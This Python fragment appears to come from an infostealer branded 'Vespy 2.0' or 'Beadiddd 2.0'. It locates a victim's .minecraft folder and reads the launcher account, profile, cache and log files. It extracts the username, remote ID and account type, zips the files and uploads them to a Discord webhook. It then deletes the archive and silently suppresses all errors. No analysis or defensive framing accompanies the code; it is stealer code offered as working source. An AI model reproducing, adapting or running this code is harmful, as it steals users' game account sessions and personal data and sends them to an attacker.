C=open
class A:
	def __init__(A):
		H='\\Minecraft.zip';G='\\launcher_accounts.json';D='",'
		try:
			A.content='';B=f"C:\\Users\\{user}\\AppData\\Roaming\\.minecraft"
			try:
				I=['launcher_accounts.json','usercache.json','launcher_profiles.json','launcher_log.txt'];A.user=C(B+'\\usercache.json').read().split('[{"name":"')[1].split(D)[0];A.idd=C(B+G).read().split('"remoteId" : "')[1].split(D)[0];A.typE=C(B+G).read().split('"type" : "')[1].split(D)[0]
				with ZipFile(B+H,'w')as E:
					for F in I:A.content+=f"{F}\n";E.write(B+'\\'+F)
					E.close()
			except:pass
			A.send(B+H)
		except:pass
	def send(D,_):F='Vespy 2.0';E='https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png';B=DiscordWebhook(url=wbh,username=F,avatar_url=E);B.add_file(file=C(_,'rb').read(),filename='Minecraft.zip');B.execute();B=DiscordWebhook(url=wbh,username=F,avatar_url=E);A=DiscordEmbed(title=f"Minecraft Session",description=f"Found A Minecraft Session",color='4300d1');A.set_author(name='author : Beadiddd',icon_url=E);A.set_footer(text='Beadiddd 2.0 | by : Beadiddd');A.set_timestamp();A.add_embed_field(name=f":green_square: Account of :ㅤㅤㅤ",value=f"``{D.user}``");A.add_embed_field(name=f":video_game: Type :ㅤㅤㅤ",value=f"``{D.typE}``");A.add_embed_field(name=f":id: Remote ID :ㅤㅤㅤ",value=f"``{D.idd}``");A.add_embed_field(name=f"\n:open_file_folder: Files Found",value=f"```{D.content}```");B.add_embed(A);B.execute();os.remove(_)